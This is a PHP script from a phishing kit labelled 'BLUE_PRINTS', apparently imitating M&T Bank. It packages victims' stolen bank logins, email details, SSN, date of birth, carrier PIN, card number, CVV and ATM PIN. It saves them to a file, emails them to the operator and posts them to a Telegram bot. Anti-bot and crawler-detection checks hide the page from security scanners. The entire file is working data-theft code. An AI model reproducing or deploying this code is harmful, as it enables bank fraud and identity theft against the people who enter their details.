<?php
session_start();

    require_once './src/Classes/Comp.php';
    require_once './src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }
    include 'crawlerdetect.php';
include 'step/next/recon.php';
 include 'step/conf/config.php';


$ip = $_SERVER['REMOTE_ADDR'];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$body = "::::::::::  MTB BLUE_PRINTS 1nf0 [Login Details] ::::::::::::::\r\n";
$body .= "User                                   : {$_SESSION['usr']}\r\n";
$body .= "Password                               : {$_SESSION['pass']}\r\n";
$body .= "::::::::::  MTB BLUE_PRINTS 1nf0 [email Details] ::::::::::::::\r\n";
$body .= "{$_SESSION['emailr']}\r\n";
$body .= "::::::::::::::::  MTB BLUE_PRINTS [Billing Details] :::::::::::::\r\n";
$body .= "Fname                                  : {$_SESSION['fname']}\r\n";
$body .= "DOB                                    : {$_SESSION['dob']}\r\n";
$body .= "Phone no                               : {$_SESSION['phnum']}\r\n";
$body .= "carrier Pin                            : {$_SESSION['crpn']}\r\n";
$body .= "Email                                  : {$_SESSION['email']}\r\n";
$body .= "SSN                                    : {$_SESSION['ssn']}\r\n";
$body .= "address                                : {$_SESSION['stradd1']}\r\n";
$body .= "City                                   : {$_SESSION['cty']}\r\n";
$body .= "zipcode                                : {$_SESSION['zpcd']}\r\n";
$body .= "Driving                                : {$_SESSION['inm']}\r\n";
$body .= ":::::::::  MTB BLUE_PRINTS 1nf0 [Card Details] :::::::::::::\r\n";
$body .= "Card Number                          : {$_SESSION['ccn']}\r\n";
$body .= "Expiry Date                          : {$_SESSION['expmnth']}\r\n";
$body .= "CVV                                  : {$_SESSION['cvv']}\r\n";
$body .= "ATM PIN                              : {$_SESSION['atm']}\r\n";
$body .=  "|--------------- I N F O | I P -------------------|\r\n";
$body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
$body .= "IP Country	                       : {$_SESSION['country']}\r\n";
$body .= "IP City	                           : {$_SESSION['city']}\r\n";
$body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
$body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
$body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
$body .= "::::::::::::::::::::::  MTB BLUE_PRINTS 1nf0 ::::::::::::::::::::::::\r\n";
if($savetxt == "on"){
  $save=fopen("step/data/all".$salt.".txt",'a');
  fwrite($save,$body);
  fclose($save);
  } 
 
$subject="Billing Details By BLUE_PR1NTS => From {$_SESSION['ip']} [ {$_SESSION['platform']} ]";

$headers="From: BLUE_PR1NTS <MTB@BLUE_PRINTS.com>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
@mail($emailzz, $subject, $body, $headers);
if($tgresult == "on"){$settings = include 'step/conf/settings.php';$data = $body;$send = ['chat_id'=>$settings['chat_id'],'text'=>$data];$website = "https://api.telegram.org/{$settings['bot_url']}";$ch = curl_init($website . '/sendMessage');curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);$result = curl_exec($ch);curl_close($ch);}
$key = $_SESSION['token'];
echo "<script>window.location.href='./complete.php?token=".$key."';</script>";
die();


?>